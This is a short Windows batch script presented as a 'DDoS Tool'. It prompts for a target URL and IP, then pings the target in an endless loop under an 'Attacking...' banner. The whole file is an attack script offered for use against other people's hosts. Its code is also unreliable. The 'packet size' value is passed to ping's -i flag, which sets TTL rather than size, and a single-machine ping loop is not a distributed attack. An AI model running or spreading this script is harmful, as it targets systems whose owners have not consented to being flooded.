@echo off
chcp 65001 >nul
title DDoS Tool - By Frnaxx
color 0a
cls
echo.
set /p x=Target-URL:
echo.
echo ===================================
ping %x%
echo ===================================
@ping.exe 127.0.0.1 -n 5 -w 1000 > nul
goto Next
:Next
echo.
set /p m=Target IP: 
echo.
set /p n=Paccket Size:
echo.
color 0c
echo Attacking...
echo.
:DDOS
ping %m% -i %n% -t >nul
goto DDOS
